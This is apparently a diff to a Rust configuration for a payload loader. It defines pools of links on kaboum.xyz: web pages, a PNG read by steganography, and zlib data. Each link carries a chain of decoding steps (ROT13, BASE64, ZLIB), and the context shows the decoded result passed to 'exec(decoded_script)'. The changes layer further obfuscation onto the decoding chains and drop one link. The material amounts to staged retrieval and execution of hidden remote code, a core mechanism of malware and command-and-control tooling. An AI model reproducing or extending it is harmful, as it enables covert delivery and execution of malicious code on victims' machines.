@@ -318,7 +318,7 @@ exec(decoded_script)
         (
             1,
             (
-                "kaboum.xyz first links".to_string(),
+                "kaboum.xyz".to_string(),
                 PoolLinks {
                     pool_mode: PoolMode::ADVANCED(Advanced {
                         random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
@@ -332,19 +332,13 @@ exec(decoded_script)
                     pool_links: vec![
                         Link::HTTP(HTTPLink {
                             url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
-                            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                            dataoperation: vec![DataOperation::WEBPAGE,DataOperation::ROT13, DataOperation::BASE64, DataOperation::ZLIB ],
                             jitt: 0,
                             sleep: 0,
                         }),
                         Link::HTTP(HTTPLink {
                             url: String::from("https://kaboum.xyz/artdonjon/empty.png"),
                             dataoperation: vec![DataOperation::STEGANO],
-                            jitt: 0,
-                            sleep: 0,
-                        }),
-                        Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/zzzlib"),
-                            dataoperation: vec![DataOperation::ZLIB],
                             jitt: 0,
                             sleep: 0,
                         }),
@@ -372,7 +366,7 @@ exec(decoded_script)
                     pool_mode: PoolMode::SIMPLE,
                     pool_links: vec![Link::HTTP(HTTPLink {
                         url: String::from("https://kaboum.xyz/artdonjon/backup1.html"),
-                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                         jitt: 0,
                         sleep: 0,
                     })],
@@ -387,7 +381,7 @@ exec(decoded_script)
                     pool_mode: PoolMode::SIMPLE,
                     pool_links: vec![Link::HTTP(HTTPLink {
                         url: String::from("https://kaboum.xyz/artdonjon/backup2.html"),
-                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                         jitt: 0,
                         sleep: 0,
                     })],
